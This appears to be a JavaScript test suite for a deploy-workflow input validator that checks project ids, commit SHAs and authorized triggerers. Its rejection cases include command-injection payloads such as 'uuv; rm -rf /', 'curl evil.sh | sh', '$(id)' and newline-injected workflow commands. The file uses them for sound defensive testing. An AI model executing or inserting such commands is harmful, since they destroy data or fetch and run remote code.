// M3 · tools/proyecto-valido.mjs: valida el proyecto, el sha y quién dispara antes de construir en deploy-cloudflare.yml.
// El workflow lo llama como `node tools/proyecto-valido.mjs "$PROYECTO" "$SHA" "$REMITENTE"` (valores siempre por env:).
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";

const ROOT = fileURLToPath(new URL("..", import.meta.url));
const CLI = fileURLToPath(new URL("../tools/proyecto-valido.mjs", import.meta.url));
const cargar = () => import("../tools/proyecto-valido.mjs");

const PROYECTOS = [
  { id: "uuv", repo: "o/uuv", branch: "main", editoresDocs: ["cyuxSz", "Ana-Lopez"] },
  { id: "otro-proyecto", repo: "o/x", branch: "main" },
];
const SHA = "0123456789abcdef0123456789abcdef01234567";

const MALOS = [
  "",
  "uuv; rm -rf /",
  "uuv && curl evil.sh | sh",
  "$(id)",
  "uuv`id`",
  "uuv\n",
  "uuv\n::warning::falso",
  " uuv",
  "uuv ",
  "UUV",
  "../uuv",
  "uuv/../x",
  "__proto__",
  "constructor",
  "toString",
  "no-existe",
  "a".repeat(200),
];

test("esProyectoValido: acepta solo ids que existen en la lista", async () => {
  const { esProyectoValido } = await cargar();
  assert.equal(esProyectoValido("uuv", PROYECTOS), true);
  assert.equal(esProyectoValido("otro-proyecto", PROYECTOS), true);
  for (const m of MALOS) assert.equal(esProyectoValido(m, PROYECTOS), false, JSON.stringify(m));
});

test("esProyectoValido: tolera tipos raros sin lanzar", async () => {
  const { esProyectoValido } = await cargar();
  for (const v of [undefined, null, 1, {}, ["uuv"], { id: "uuv" }]) assert.equal(esProyectoValido(v, PROYECTOS), false);
});

test("esShaValido: 40 hex en minúsculas; vacío no es un sha", async () => {
  const { esShaValido } = await cargar();
  assert.equal(esShaValido(SHA), true);
  for (const m of ["", "abc", SHA.slice(0, 39), SHA + "0", SHA.toUpperCase(), `${SHA.slice(0, 39)}g`, `${SHA}\n`, ` ${SHA}`, `${SHA.slice(0, 30)}; rm -rf`, undefined, null, 123]) {
    assert.equal(esShaValido(m), false, JSON.stringify(m));
  }
});

test("puedeDisparar: solo logins en editoresDocs del proyecto (sin distinguir mayúsculas)", async () => {
  const { puedeDisparar } = await cargar();
  assert.equal(puedeDisparar("cyuxSz", "uuv", PROYECTOS), true);
  assert.equal(puedeDisparar("cyuxsz", "uuv", PROYECTOS), true);
  assert.equal(puedeDisparar("ana-lopez", "uuv", PROYECTOS), true);
  assert.equal(puedeDisparar("otra", "uuv", PROYECTOS), false);
  assert.equal(puedeDisparar("", "uuv", PROYECTOS), false);
  assert.equal(puedeDisparar(undefined, "uuv", PROYECTOS), false);
  // Sin editoresDocs nadie puede disparar por proyecto (se actualiza con el build completo).
  assert.equal(puedeDisparar("cyuxSz", "otro-proyecto", PROYECTOS), false);
  assert.equal(puedeDisparar("cyuxSz", "no-existe", PROYECTOS), false);
});

test("validarDisparo: combina proyecto, sha opcional y remitente", async () => {
  const { validarDisparo } = await cargar();
  assert.equal(validarDisparo({ proyecto: "uuv", sha: SHA, remitente: "cyuxSz" }, PROYECTOS).ok, true);
  assert.equal(validarDisparo({ proyecto: "uuv", sha: "", remitente: "cyuxSz" }, PROYECTOS).ok, true, "sha vacío = último commit");
  for (const caso of [
    { proyecto: "", sha: "", remitente: "cyuxSz" },
    { proyecto: "uuv; rm -rf /", sha: "", remitente: "cyuxSz" },
    { proyecto: "uuv", sha: "abc", remitente: "cyuxSz" },
    { proyecto: "uuv", sha: `${SHA}; rm -rf /`, remitente: "cyuxSz" },
    { proyecto: "uuv", sha: SHA, remitente: "" },
    { proyecto: "uuv", sha: SHA, remitente: "intruso" },
    { proyecto: "otro-proyecto", sha: SHA, remitente: "cyuxSz" },
  ]) {
    const r = validarDisparo(caso, PROYECTOS);
    assert.equal(r.ok, false, JSON.stringify(caso));
    assert.equal(typeof r.error, "string");
    assert.ok(r.error.length > 0);
  }
});

const sinTraza = (r) => assert.doesNotMatch(r.stderr, /ERR_MODULE_NOT_FOUND|\n\s+at /, "mensaje propio, sin traza de pila");
const correr = (...args) => spawnSync(process.execPath, [CLI, ...args], { cwd: ROOT, encoding: "utf8" });

test("CLI: con projects.json real, uuv + sha + editor válido sale con 0", () => {
  const proyectos = JSON.parse(readFileSync(new URL("../projects.json", import.meta.url), "utf8"));
  const editor = proyectos.find((p) => p.id === "uuv")?.editoresDocs?.[0];
  assert.ok(editor, "uuv necesita editoresDocs en projects.json");
  const r = correr("uuv", SHA, editor);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(correr("uuv", "", editor).status, 0, "sin sha también vale");
});

test("CLI: entradas inválidas salen con 1 y no repiten la entrada en el log", () => {
  for (const [p, s, u] of [
    ["uuv; rm -rf /", SHA, "cyuxSz"],
    ["$(id)", SHA, "cyuxSz"],
    ["uuv", "nada; rm -rf /", "cyuxSz"],
    ["uuv", SHA, "intruso-rm -rf"],
    ["uuv\n::error::inyectado", SHA, "cyuxSz"],
    ["", "", ""],
  ]) {
    const r = correr(p, s, u);
    assert.equal(r.status, 1, JSON.stringify([p, s, u]));
    const salida = r.stdout + r.stderr;
    assert.doesNotMatch(salida, /rm -rf|\$\(id\)|::error::inyectado/, "no repite la entrada (evita comandos de workflow en el log)");
    assert.ok(r.stderr.trim().length > 0, "explica el motivo en stderr");
    sinTraza(r);
  }
});

test("CLI: sin argumentos sale con 1 (proyecto obligatorio)", () => {
  const r = correr();
  assert.equal(r.status, 1);
  sinTraza(r);
});

test("CLI: falta el remitente → 1", () => {
  const r = correr("uuv", SHA);
  assert.equal(r.status, 1);
  sinTraza(r);
});

test("projects.json: uuv tiene editoresDocs (logins válidos)", () => {
  const proyectos = JSON.parse(readFileSync(new URL("../projects.json", import.meta.url), "utf8"));
  const uuv = proyectos.find((p) => p.id === "uuv");
  assert.ok(Array.isArray(uuv.editoresDocs) && uuv.editoresDocs.length > 0);
  for (const l of uuv.editoresDocs) assert.match(l, /^[A-Za-z0-9](?:[A-Za-z0-9-]{0,38})$/);
});
